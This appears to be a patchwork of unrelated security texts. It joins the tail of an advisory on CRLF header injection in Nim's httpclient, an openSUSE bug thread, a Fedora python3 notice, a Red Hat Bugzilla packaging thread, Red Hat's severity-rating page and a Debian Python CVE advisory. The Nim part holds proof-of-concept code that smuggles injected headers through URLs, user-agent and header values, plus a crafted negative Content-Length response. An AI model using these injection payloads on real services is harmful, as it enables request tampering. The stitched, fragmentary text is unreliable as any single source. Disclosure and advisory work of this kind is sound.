echo response.contentLength()
echo response.body()
```

Serialized request: see `X-injected`

```http
GET /?a=1 HTTP/1.1
X-injected: header
TEST: 123 HTTP/1.1
Host: localhost:4433
Connection: Keep-Alive
content-length: 0
user-agent: Nim httpclient/1.2.4

```

b) in the path

```nim
import httpClient
var client = newHttpClient()
var response = client.get("https://localhost:4433/a/1 HTTP/1.1\r\nX-injected: header\r\nTEST: 123")
echo response.contentLength()
echo response.body()
```

Serialized request: see `X-injected`

```http
GET /a/1 HTTP/1.1
X-injected: header
TEST: 123 HTTP/1.1
Host: localhost:4433
Connection: Keep-Alive
content-length: 0
user-agent: Nim httpclient/1.2.4

```

2) header injection in user-agent, http headers

```nim
import httpClient
var client = newHttpClient("MyUserAgent\r\nX-Injected: myheader")
client.headers = newHttpHeaders({ "Content-Type": "applicat\r\nion/json" })
var response = client.get("https://localhost:4433?a=1 HTTP/1.1\r\nX-injected: header\r\nTEST: 123")
echo response.contentLength()
echo response.body()
```

Serialized request: see `X-injected`, `TEST: 123`

```http
GET /?a=1 HTTP/1.1
X-injected: header
TEST: 123 HTTP/1.1
Host: localhost:4433
Connection: Keep-Alive
content-length: 0
content-type: applicat
ion/json
user-agent: MyUserAgent
X-Injected: myheader

```

3) Integers are parsed as signed ints instead of natural numbers

The `httpClient` silently accepts invalid return parameters. For example, the content-length header is initially stored as a string without being verified to be in a proper range. When accessing it, it is being parsed as a signed integer and therefore allows to return negative numbers.

```nim
proc contentLength*(response: Response | AsyncResponse): int =
## Retrieves the specified response's content length.
##
## This is effectively the value of the "Content-Length" header.
##
## A ``ValueError`` exception will be raised if the value is not an integer.
var contentLengthHeader = response.headers.getOrDefault("Content-Length")
return contentLengthHeader.parseInt()
```

Request:
```http
GET /?a=1 HTTP/1.1
X-injected: header
TEST: 123 HTTP/1.1
Host: localhost:4433
Connection: Keep-Alive
content-length: 0
user-agent: Nim httpclient/1.2.4

```

Malicious server response: `Content-Length: -23`
```http
HTTP/1.1 200 OK
Date: Sun, 10 Oct 2010 23:26:07 GMT
Server: Apache/2.2.8 (Ubuntu) mod_ssl/2.2.8 OpenSSL/0.9.8g
Last-Modified: Sun, 26 Sep 2010 22:04:35 GMT
ETag: "45b6-834-49130cc1182c0"
Accept-Ranges: bytes
Content-Length: -23
Connection: close
Content-Type: text/html

Hello world!

```

Accessing the `Content-Length` yields the negative number -23.

```nim
import httpClient
var client = newHttpClient()
var response = client.get("http://localhost:4433/a/1 HTTP/1.1\r\nX-i\x00\x01YOnjected: header\r\nTEST: 123")
echo response.contentLength()
echo response.body()
```

output:

```
⇒ nim c -r -d:ssl client_inject.nim
...
Hint: [Link]
Hint: 112071 LOC; 1.103 sec; 112.691MiB peakmem; Debug build; proj: /Users/tintin/workspace/nim/test/issues/httpclient/inject/client_inject.nim; out: /Users/tintin/workspace/nim/test/issues/httpclient/inject/client_inject [SuccessX]
Hint: /Users/tintin/workspace/nim/test/issues/httpclient/inject/client_inject [Exec]
-23
```

This might pose a risk to applications that are not checking whether response values are within sane bounds.

## Vendor Response

Vendor response: fixed in [v1.2.6](<https://nim-lang.org/blog/2020/07/30/versions-126-and-108-released.html>)

Currently tested in Staging:I [https://build.opensuse.org/package/live_build_log/openSUSE:Factory:Staging:I/python/standard/x86_64](https://build.opensuse.org/package/live_build_log/openSUSE%3AFactory%3AStaging%3AI/python/standard/x86_64) [https://build.opensuse.org/package/live_build_log/openSUSE:Factory:Staging:I/python3-base/standard/x86_64](https://build.opensuse.org/package/live_build_log/openSUSE%3AFactory%3AStaging%3AI/python3-base/standard/x86_64) ``` [Comment 1](show_bug.cgi?id=1042670#c1)  Jan Matejek   2017-06-12 10:42:23 UTC  ``` adding what I found so far:  The problem is that Python's test suite is expecting the ALPN test to return a fatal alert when asking for a protocol that is unknown on the server. OpenSSL changelog claims that this has changed in 1.1 (originally it returned an empty match set ... or something). However, the actual behavior as the test suite sees it is the same as in 1.0.  I haven't been able to find the relevant code in openssl, and so far I was not successful in debugging exactly what code path Python is taking here. ``` [Comment 2](show_bug.cgi?id=1042670#c2)  Vítězslav Čížek   2017-08-20 07:57:13 UTC  ``` There's an upstream bug for this issue: <https://bugs.python.org/issue30714>  Fixes were committed a few days ago. 3.6: <https://github.com/python/cpython/commit/7f6a13bd562ff6a265fc63a991327feaecb07a77> 2.7: <https://github.com/python/cpython/commit/05b7d9c6675b71d17f5fcf379b3888fba431f14e> ``` [Comment 3](show_bug.cgi?id=1042670#c3)  Vítězslav Čížek   2017-09-19 15:29:55 UTC  ``` Fixed packages were submitted to Factory: <https://build.opensuse.org/request/show/527324> <https://build.opensuse.org/request/show/527332> ``` [Comment 4](show_bug.cgi?id=1042670#c4)  Swamp Workflow Management   2018-04-23 08:40:14 UTC  ``` This is an autogenerated message for OBS integration: This bug (1042670) was mentioned in <https://build.opensuse.org/request/show/599907> Factory / python3 ``` [Comment 14](show_bug.cgi?id=1042670#c14)  Swamp Workflow Management   2019-12-11 20:20:37 UTC  ``` SUSE-SU-2019:14246-1: An update that fixes 118 vulnerabilities is now available.

Fedora Update Notification
FEDORA-2019-1ffd6b6064
2019-05-17 01:03:28.819325
--------------------------------------------------------------------------------

Name : python3
Product : Fedora 30
Version : 3.7.3
Release : 3.fc30
URL : <https://www.python.org/>
Summary : Interpreter of the Python programming language
Description :
Python is an accessible, high-level, dynamically typed, interpreted programming
language, designed with an emphasis on code readability.
It includes an extensive standard library, and has a vast ecosystem of
third-party libraries.

The python3 package provides the "python3" executable: the reference
interpreter for the Python language, version 3.
The majority of its standard library is provided in the python3-libs package,
which should be installed automatically along with python3.
The remaining parts of the Python standard library are broken out into the
python3-tkinter and python3-test packages, which may need to be installed
separately.

Documentation for Python is provided in the python3-docs package.

Packages containing additional libraries for Python are generally named with
the "python3-" prefix.

--------------------------------------------------------------------------------

RHEL Engineering is moving the tracking of its product development work on RHEL 6 through RHEL 9 to Red Hat Jira ([**issues.redhat.com**](https://issues.redhat.com)). If you're a Red Hat customer, please continue to file support cases via the [**Red Hat customer portal**](https://access.redhat.com/support/cases/). If you're not, please head to the "[**RHEL project**](https://issues.redhat.com/projects/RHEL)" in Red Hat Jira and file new tickets here. Individual Bugzilla bugs in the statuses "**NEW**", "**ASSIGNED**", and "**POST**" are being migrated throughout September 2023. Bugs of Red Hat partners with an assigned Engineering Partner Manager (EPM) are migrated in late September as per pre-agreed dates. Bugs against components "**kernel**", "**kernel-rt**", and "**kpatch**" are only migrated if still in "**NEW**" or "**ASSIGNED**". If you cannot log in to RH Jira, please consult [**article #7032570**](https://access.redhat.com/articles/7032570). That failing, please send an e-mail to the RH Jira admins at **rh-issues@redhat.com** to troubleshoot your issue as a user management inquiry. The email creates a ServiceNow ticket with Red Hat. Individual Bugzilla bugs that are migrated will be moved to status "**CLOSED**", resolution "**MIGRATED**", and set with "**MigratedToJIRA**" in "**Keywords**". The link to the successor Jira issue will be found under "**Links**", have a little "two-footprint" icon next to it, and direct you to the "[**RHEL project**](https://issues.redhat.com/projects/RHEL)" in Red Hat Jira (issue links are of type "**https://issues.redhat.com/browse/RHEL-XXXX**", where "**X**" is a digit). This same link will be available in a blue banner at the top of the page informing you that that bug has been migrated.

| [Description](show_bug.cgi?id=1701286#c0)  Miro Hrončok    2019-04-18 14:50:05 UTC  ``` Upstream CPython bundles pre-built wheels of setuptools and pip. It installs them to the system when the ensurepip module is invoked, or to new virtual environments created via the venv module (the venv module transitively invokes the ensurepip module).  In Fedora, we remove those bundled wheels and we have a workaround.  In Fedora 28 (and earlier), we had a rather large custom patch in python3 (named "rewheel") that made the ensurepip module (and transitively venv) collect the files from the installed python3-setuptools and python3-pip packages, "rewheeled" them into an on demand wheel in /tmp and used that wheel instead of the originally bundled one.  Since Fedora 29, we do it differently. During the build of python-setuptools and python-pip RPMs a wheel is built from sources. The components gained a new subpackage python-setuptools-wheel / python-pip-wheel with the wheel:  $ rpm -ql python-pip-wheel /usr/share/licenses/python-pip-wheel /usr/share/licenses/python-pip-wheel/LICENSE.txt /usr/share/python-wheels /usr/share/python-wheels/pip-19.0.3-py2.py3-none-any.whl   Python is then patched simply to look for the wheels in different location and pick the highest available version instead of the hardcoded one.  The change can be seen in <https://src.fedoraproject.org/rpms/python3/pull-request/49>  It has several benefits (with footnotes):   - the patch is trivial and doesn't need much maintenance [1], whereas this was not true for the previous "rewheel" patch  - RPM built wheels can be used in multiple Python interpreters assuming they are compatible - in Fedora they are currently compatible with Python 2.7, 3.4-3.8, both PyPys and somehow also with Jython [2]  - when python-wheel also gains a wheel package (python-wheel-wheel), together those RPM built wheels can also be used in the python-virtualenv package - previously it just bundled the wheels from upstream  - the mechanism in ensurepip is as much upstream-similar as possible  - when pip or setuptools is updated after python3 is built, the version reported by the ensurepip module remains current, whereas previously it was baked in on build time  - python3 doesn't depend on python3-pip and  python3-setuptools packages, which might be appreciated by some system administrators [3]   To lower the maintenance burden, I suppose we should update python in RHEL 8.1 to be aligned with Fedora 29+ in this manner.  Python 2 in RHEL 6/7 doesn't have pip.  Python 3 in RHEL 7 has rewheel. Whether it should stay that way or not is out of scope here.   ------------------------  [1] The patch needs to be rebased when new setuptools/pip releases are bundled within a new python release, however the rebasing only consists of hardcoded version bumps in the original - that serves as a reminder to also update the versions hardcoded in the specfile (used when this entire patch is bconded out)  [2] They are not compatible with Python 2.6 but that doesn't have neithr ensurepip nor venv  [3] Technically it still depends on pip and setuptools wheels, however those are not "installed" (from Python perspective) but only "available"   ```  [Comment 1](show_bug.cgi?id=1701286#c1)  Tomas Orsava    2019-04-23 14:26:12 UTC  ``` I propose that we do a slight adjustment for RHEL in regards to the wheel packages. As the python2 / python3 / (future) python38 / ... versions in RHEL8 should be independent, an update to setuptools/pip/wheel of one of them should not affect the others. Therefore I believe we should instead version the packages (e.g. python3-setuptools-wheel), and make one for each Python stack in RHEL8.  This will also most likely necessitate a different file location, as `/usr/share/python-wheels/pip-19.0.3-py2.py3-none-any.whl` is not versioned either, and the files could clash.   ```  [Comment 2](show_bug.cgi?id=1701286#c2)  Miro Hrončok    2019-04-23 14:36:12 UTC  ``` The modules make this indeed more complicated.   ```  [Comment 3](show_bug.cgi?id=1701286#c3)  Miro Hrončok    2019-05-07 13:20:22 UTC  ``` I propose this path for modules:      /usr/share/<module_name>-wheels/  E.g.      /usr/share/python36-wheels/pip-19.0.3-py2.py3-none-any.whl   ```  [Comment 4](show_bug.cgi?id=1701286#c4)  Tomas Orsava    2019-05-14 21:49:28 UTC  ``` Sounds good.   ```  [Comment 5](show_bug.cgi?id=1701286#c5)  Petr Viktorin (pviktori)    2019-05-16 12:40:44 UTC  ``` Sounds good.   ```  [Comment 7](show_bug.cgi?id=1701286#c7)  Yaakov Selkowitz    2019-07-05 13:50:32 UTC  ``` This change has caused a noticeable increase in the size of the ubi8 base image.  While I understand the reason for leaving Requires: platform-python-setuptools for platform-python, as many packages do rely on it at runtime, what would require pip at runtime that it too needs to be pulled in "just in case"?    FWIW, as a point of reference in Fedora:  $ dnf repoquery --whatrequires python3-pip --releasever=30 hatch-0:0.20.0-9.fc30.noarch mozilla-iot-gateway-addon-python-0:0.8.0-2.fc30.noarch parsero-0:0.81-12.fc30.noarch pipenv-0:2018.11.26-7.fc30.noarch python3-Lektor-0:3.0.1-6.fc30.noarch python3-django-markdownx-0:2.0.28-1.fc30.noarch python3-pipdeptree-0:0.13.1-3.fc30.noarch python3-pipdeptree-0:0.13.2-1.fc30.noarch python3-pypandoc-0:1.4-7.fc30.noarch python3-virtualenv-api-0:2.1.16-6.fc30.noarch thonny-0:3.1.1-1.fc30.noarch  I don't think any of those are in RHEL, and if any are, it's certainly few enough to fix individually.  (For comparison, python3-setuptools shows 384 reverse dependencies for F30.)  If the Requires: platform-python-pip (which is by far the larger of the two) would be dropped from platform-python, that would help significantly with base image size.   ```  [Comment 12](show_bug.cgi?id=1701286#c12)  Lukáš Zachar    2019-09-27 06:17:37 UTC  ``` I've created [bug 1756217](show_bug.cgi?id=1756217 "CLOSED ERRATA - Lower footprint of platform-python") to discuss & fix size of platform-python dependencies.   ```  [Comment 18](show_bug.cgi?id=1701286#c18)  errata-xmlrpc    2019-11-05 22:03:43 UTC  ``` Since the problem described in this bug report should be resolved in a recent advisory, it has been closed with a resolution of ERRATA.

Red Hat Satellite 6.2 is on Maintenance Support 2 phase, hence only selected critical and important issues will be fixed. Please refer to Red Hat Satellite Product Life Cycle page for more information.  In Red Hat OpenStack Platform 13, because the flaw has a lower impact and the fix would require a substantial amount of development, no update will be provided at this time for the RHOSP python-urllib3 package.   ``` |  |

# Severity ratings

## Understanding Red Hat security ratings

Red Hat Product Security rates the severity of security issues found
in Red Hat products using a four-point scale (Low, Moderate,
Important, and Critical), as well as including a separate Common
Vulnerability Scoring System (CVSS) base score. These scoring systems
provide a prioritized risk assessment to help you understand and
schedule upgrades to your systems, enabling informed decisions on the
risk each issue places on your unique environment.

The four-point scale tells you how serious Red Hat considers an issue
to be, helping you judge the severity and determine the most important
updates. The scale takes into account the potential risk based on a technical analysis of the exact flaw and its type. The risk level of a flaw does not change if an exploit or worm is later released for a flaw, or if one is available before the release of a fix. A flaw will only be re-evaluated if new technical details emerge.

The following table provides severity ratings for Red Hat products and systems. For flaws specific to AI models, see [Red Hat security ratings for AI models](https://access.redhat.com/security/ai).

| **Severity ratings** | **Security flaw description** |
| --- | --- |
| **Critical impact** | This rating is given to flaws that could be easily exploited by a remote unauthenticated attacker and lead to system compromise (arbitrary code execution) without requiring user interaction, or easily cause system compromise via inference end points on AI systems. Flaws that require authentication, local or physical access to a system, or an unlikely configuration are not classified as Critical impact. These are the types of vulnerabilities that can be exploited by worms. |
| **Important impact** | This rating is given to flaws that can easily compromise the confidentiality, integrity or availability of resources. These are the types of vulnerabilities that allow local or authenticated users to gain additional privileges, allow unauthenticated remote users to view resources that should otherwise be protected by authentication or other controls, allow authenticated remote users to execute arbitrary code, allow remote users to cause a denial of service, or can cause system compromise via inference end points on AI systems. |
| **Moderate impact** | This rating is given to flaws that may be more difficult to exploit but could still lead to some compromise of the confidentiality, integrity or availability of resources under certain circumstances. It is also given to flaws that could be exploited to cause denial of service-like conditions on AI systems via an inference end point, or allow attackers to steal other users’ data from the AI system without authorization. These are the types of vulnerabilities that could have had a Critical or Important impact but are less easily exploited based on a technical evaluation of the flaw and/or affect unlikely configurations. || **Low impact** | This rating is given to all other issues that may have a security impact. These are the types of vulnerabilities that are believed to require unlikely circumstances to be able to be exploited, or where a successful exploit would give minimal consequences. This includes flaws that are present in a program’s source code but to which no current or theoretically possible, but unproven, exploitation vectors exist or were found during the technical analysis of the flaw. |

A Red Hat security advisory can contain fixes for more than one
vulnerability and for packages for more than one product (such as both
Red Hat Enterprise Linux 7 and 8). Each issue in an advisory has a
severity rating for each product. The overall severity of an advisory
is the highest severity out of all the individual issues, across all
the products the advisory targets. For simplicity, advisories only
show the overall severity. The advisories contain links to the
relevant entries in Red Hat's bug-tracking system, where you can
examine individual severity ratings and additional commentary, as well
as links to the relevant pages in Red Hat’s CVE database.

When a technology—enabled and most likely used by default—completely
blocks the exploitation of a particular vulnerability across all
architectures, we will adjust the severity level. When a technology
reduces the risk of a vulnerability, we may adjust the severity level
and give an explanation of the decision in the bug-tracking  and CVE
database entries.

## Common Vulnerability Scoring System (CVSS)

Common Vulnerability Scoring System (CVSS) base scores provide
additional guidance about a vulnerability, giving a detailed severity
rating by scoring the constant aspects of a vulnerability: Attack
Vector, Attack Complexity, User Interaction, Privileges Required,
Scope, Confidentiality, Integrity, and Availability.

CVSS version 2 base metrics are available for all vulnerabilities from
2009-2016, as well as selected earlier vulnerabilities. In 2016, Red
Hat adopted the CVSS v3 standard, and all vulnerabilities going
forward will use version 3.1 for scoring. These scores are found on
the
[CVE pages](https://access.redhat.com/security/security-updates/#/cve)
(linked from the References section of each Red Hat Security Advisory).

Red Hat does not solely use the CVSS rating to determine the priority
with which flaws are fixed, or to determine the severity rating of the
vulnerability. It is used as a guideline to identify and describe key
metrics of a flaw, however the priority for which flaws are fixed is
determined by the overall severity of the flaw using the
aforementioned four-point scale.  CVSS is meant to help customers
prioritize the order in which they remediate flaws.

### CVSS v3 Base Metrics

The CVSS v3 base metrics group covers the constant aspects of a
vulnerability:

* Attack Vector (AV) - Expresses the "remoteness" of the attack and
  how the vulnerability is exploited.
* Attack Complexity (AC) - Speaks to the difficulty of executing an
  attack and what factors are needed for it to be successful. (Along
  with User Interaction, Attack Complexity was formerly part of the
  Access Complexity metric.).
* User Interaction (UI) - Determines whether the attack requires an
  active human to participate or if the attack can be automated.
* Privileges Required (PR) - Documents the level of user
  authentication required for the attack to be successful. (This
  replaces the former Authentication metric.).
* Scope (S) - Determines whether an attacker can impact a component
  beyond its security scope/authority.
* Confidentiality (C) - Determines whether unauthorized parties can
  access data and to what extent.
* Integrity (I) - Measures the impact to the trustworthiness and
  veracity of data.
* Availability (A) - Refers to the impact to accessibility of data or
  services for authorized users.

A formula translates these measurements into a single, numerical base
score, ranging from 0.0 (no risk) to 10.0 (highest risk). Refer to
[Common Vulnerability Scoring System v3.1: User Guide](https://www.first.org/cvss/user-guide)
for detailed descriptions of the base metrics. It is important to note
that the CVSS base metrics were designed to be used with the other
CVSS metric groups, notably the Temporal and Environmental metrics, to
provide an accurate representation of risk in customer environments.
Alone, the Base metrics offer a shallow view of the vulnerability
itself without accounting for deployment or the environment.

### How Red Hat Uses CVSS v3 Base Metrics

We aim to comply with the CVSS v3 standard when assigning base scores,
and Red Hat uses base metrics that reflect how a vulnerability affects
our products specifically.  In addition, we do not use the Qualitative
Severity Rating Scale in the CVSS v3.1 User Guide to rate severity,
and our severity ratings are always based on the aforementioned
four-point scale.  In some circumstances, it may not be obvious why a
flaw received a particular score. The following are some common
vulnerability types with our interpretation and typical scoring:

#### Libraries

It is not always possible to know how third-party applications use
libraries, making it difficult to give accurate CVSS v3 base metrics
for flaws in system libraries. When rating these flaws, we take into
account the way the library is used by applications that we ship, and
also look at other popular software that may use the library in a way
that would cause an issue to be of higher severity, and adjust the
score appropriately.

#### Other Common Scores

Flaws where a local, unprivileged user can cause a kernel to crash
(denial of service) typically score 5.5 (for example,
[CVE-2019-9213](https://access.redhat.com/security/cve/CVE-2019-9213)).

Flaws that allow a local, unprivileged user to escalate their
privileges to root typically score 7.8 (for example,
[CVE-2019-18634](https://access.redhat.com/security/cve/CVE-2019-18634)).

Cross-site scripting flaws are generally scored as having Low impact
to Integrity and/or Confidentiality, with no impact to Availability,
in line with scoring from other vendors and NVD. A typical score for
these flaws is 6.1 (for example,
[CVE-2020-11023](https://access.redhat.com/security/cve/CVE-2020-11023)).

### Base Score Variations Across Products

It is common for a given CVE-named vulnerability to have several
different CVSS base metrics, depending on the product, version, and
architecture. Examples of this include:

* A vulnerability that only affected some architectures. For example,
  [CVE-2019-15031](https://access.redhat.com/security/cve/CVE-2019-15031)
  only affected PowerPC.
* A vulnerability that is mitigated by source code protection
  mechanisms on some platforms. For example,
  [CVE-2018-1125](https://access.redhat.com/security/cve/CVE-2018-1125)
  could have led to arbitrary code execution on Red Hat Enterprise
  Linux, but it is only a denial of service because it was compiled
  with FORTIFY protections.
* A vulnerability that affected more than one product.  For example,
  [CVE-2020-14060](https://access.redhat.com/security/cve/CVE-2020-14060)
  affected a component in both OpenShift and OpenStack.  The severity
  to OpenStack was lower (Low) as compared to OpenShift (Moderate)
  based on its usage; the overall vulnerability itself was rated
  Important.

If CVSS v3 base scores are significantly different across products, we
note that separately wherever possible. If we do not split the score,
we report the metric that gives the highest CVSS v3 base score (the
worst-case outcome).

### Differences Between NVD and Red Hat Scores

For open source software shipped by multiple vendors, the CVSS base
scores may vary for each vendor's version, depending on the version
they ship, how they ship it, the platform, and even how the software
is compiled. This makes scoring vulnerabilities difficult for
third-party vulnerability databases, such as NVD, who can give only a
single CVSS base score to each vulnerability, or when comparing to
other vendors who score based on the characteristics of use in their
own products. See the
[National Vulnerability Database](https://nvd.nist.gov/vuln-metrics/cvss)
for more information regarding NVD security ratings.

These differences can cause the scores to vary widely. Other reasons
may include how the source code was compiled with certain compiler
flags or hardening technologies that reduce or eliminate the security
severity of a flaw, or how the software is used within the product.
Software running standalone may suffer from a flaw, but its use within
a product may preclude the vulnerable code from ever being used in a
way that could be exploited.

For example, NVD may rate a flaw in a particular service as having
High Impact on the CVSS CIA Triad (Confidentiality, Integrity,
Availability) where the service in question is typically run as the
root user with full privileges on a system. However, in a Red Hat
product, the service may be specifically configured to run as a
dedicated non-privileged user running entirely in a SELinux sandbox,
greatly reducing the immediate impact from compromise, resulting in
Low impact.

For these reasons, we recommend that, whenever possible, you use a
CVSS base score provided by Red Hat in preference to a score from a
third party. Please
[let us know](https://access.redhat.com/site/security/team/contact/)
if you believe we have given an incorrect CVSS v3 base score for a
particular vulnerability. We are happy to discuss and update if
needed.

Package        : python3.4
Version        : 3.4.2-1+deb8u3
CVE ID         : CVE-2018-14647 CVE-2019-9636 CVE-2019-9740 CVE-2019-9947
Debian Bug     : 921039 924072

Multiple vulnerabilities were discovered in Python, an interactive
high-level object-oriented language, including

CVE-2018-14647

    Python's elementtree C accelerator failed to initialise Expat's hash
    salt during initialization. This could make it easy to conduct
    denial of service attacks against Expat by constructing an XML
    document that would cause pathological hash collisions in Expat's
    internal data structures, consuming large amounts CPU and RAM.

CVE-2019-9636

    Improper Handling of Unicode Encoding (with an incorrect netloc)
    during NFKC normalization resulting in information disclosure
    (credentials, cookies, etc. that are cached against a given
    hostname).  A specially crafted URL could be incorrectly parsed to
    locate cookies or authentication data and send that information to
    a different host than when parsed correctly.

CVE-2019-9740

    An issue was discovered in urllib where CRLF injection is possible
    if the attacker controls a url parameter, as demonstrated by the
    first argument to urllib.request.urlopen with \r\n (specifically in
    the query string after a ? character) followed by an HTTP header or
    a Redis command.

CVE-2019-9947

    An issue was discovered in urllib where CRLF injection is possible
    if the attacker controls a url parameter, as demonstrated by the
    first argument to urllib.request.urlopen with \r\n (specifically in
    the path component of a URL that lacks a ? character) followed by an
    HTTP header or a Redis command. This is similar to the CVE-2019-9740
    query string issue.

For Debian 8 "Jessie", these problems have been fixed in version
3.4.2-1+deb8u3.

We recommend that you upgrade your python3.4 packages.
